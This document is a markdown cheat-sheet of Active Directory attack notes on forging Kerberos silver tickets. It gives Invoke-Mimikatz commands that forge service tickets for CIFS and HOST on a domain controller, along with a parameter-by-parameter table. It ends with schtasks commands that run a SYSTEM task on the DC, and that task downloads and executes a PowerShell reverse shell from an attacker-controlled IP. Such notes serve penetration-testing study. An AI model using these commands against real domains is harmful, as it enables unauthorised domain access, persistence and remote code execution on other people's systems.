# Silver Ticket

* silver ticket happens during step 5 of the kerberos workflow, displayed in the golden ticket page

* silver ticket is a valid TGS (golden ticket is TGT)
* encrypted and signed by the ntlm hash of the service account ( golden ticket is signed by hash of krbtgt) of the service running with that account
* services rarely check PAC (privileged attribute certificate)
* services will allow access only to the services themselves
* reasonable persistance period (default 30 days for computer accounts)

* using hash of the DC computer account, below command provides access to shares on the DC
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:sub.domain.local /sid:S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /target:dc.sub.domain.local /service:CIFS /rc4:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /ptt"'
```

* similar command can be used for any other service on a machine. i.e. services, HOST, RPCSS, WSMAN and more

* command breakdown

option / parameter | explanation
-------------------|-------------
kerberos::golden | name of module ( no silver module)
./User:Administrator | username of which the TGT is generated
./domain:sub.domain.local | domain FQDN
./sid:S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx | SID of domain
./target:dc.sub.domain.local | targer server FQDN
./service:CIFS | SPN name of service for which TGS is to be created
./rc4:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | NTLM (RC4) hash of the service account. use /aes128 and /aes256 for using AES keys
./id:500 /groups:512 | optional user RID (default 500) and Group (default 513 512 520 518 519)
./ptt | injects the ticket in current powershell process- no need to save the ticket on disk
./startoffset:0 | optional when the ticket is available (default 0 - right now) in minutes. use negative for a ticket available from past and a larger number for future
./endin:600 | optional ticket lifetime (mimikatz default is 10 years) in minutes. default AD setting is 10 hours = 600 minutes
./renewmax:10080 | optional ticket lifetime with renewal (mimikatz default is 10 years) in minutes. default AD setting is 7 days = 100800


* multiple ways of achieving command execution using silver tickets
* create silver ticket for the HOST SPN which allow us to schedule a task on the target
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:sub.domain.local /sid:S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /target:dc.sub.domain.local /service:HOST /rc4:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /ptt"'
```

* schedule and execute a task
```powershell
schtasks /create /S dc.sub.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://x.x.x.x:8080/Invoke-PowerShellTcp.ps1''')'"


schtasks /Run /S dc.sub.domain.local /TN "STCheck"
```









































